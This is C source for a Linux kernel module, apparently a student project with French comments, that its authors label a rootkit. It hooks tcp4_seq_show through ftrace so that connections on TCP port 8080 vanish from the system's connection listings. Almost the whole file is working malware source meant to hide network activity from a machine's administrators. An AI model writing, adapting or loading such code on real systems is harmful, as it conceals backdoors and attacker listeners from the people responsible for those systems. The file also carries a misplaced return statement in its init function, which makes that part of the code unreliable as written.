#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/version.h>

#include "ftrace_helper.h"

// licence du module (GPL = General Public License) en gros opensource
// le LKM sera marqué comme propriétaire si on ne mets pas ca et si le noyau impose des restrictions sur les modules propriétaires, ca peut poser des problemes
MODULE_LICENSE("GPL");
MODULE_AUTHOR("victor, marouane, mina, axel");
// pour avoir la description quand on fait modinfo 
MODULE_DESCRIPTION("Hide LKM");
MODULE_VERSION("0.01");


// tcp4_sqe_show() est la fonction qui affiche les connexions TCP
// un pointeur vers une structure sock est passé en 2eme argument
// on check sa valeur, si le port qu'on veut, on return 0 pour ne pas l'afficher
// va savoir pourquoi, le premier argument v est des fois pas initialisé
// ducoup on check, si c'est le cas, v = 0x1
static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);

static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
{
    struct sock *sk = v;

    // on check si le port est 8080 (0x1f90 en héxa)
    // si sk ne pointe sur rien, alors il pointe sur 0x1
    if (sk != NULL) {
        printk(KERN_INFO "rootkit: sk_num = %u\n", sk->sk_num);
        if (sk->sk_num == 0x1f90) {
            printk(KERN_INFO "rootkit: Hiding port 8080\n");
            return 0;
        }
    } else {
        printk(KERN_INFO "rootkit: sk is NULL\n");
    }
    
    
    return orig_tcp4_seq_show(seq, v);
}

static struct ftrace_hook hooks[] = {
	HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
};

/* Module initialization function */
static int __init rootkit_init(void)
{
	/* Simply call fh_install_hooks() with hooks (defined above) */
	int err;
    printk(KERN_INFO "rootkit: Installing hook for tcp4_seq_show\n");
	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
	if(err)
        printk(KERN_ERR "rootkit: Failed to install hook\n");
		return err;

	printk(KERN_INFO "rootkit: Loaded >:-)\n");

	return 0;
}

static void __exit rootkit_exit(void)
{
	/* Simply call fh_remove_hooks() with hooks (defined above) */
	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
	printk(KERN_INFO "rootkit: Unloaded :-(\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
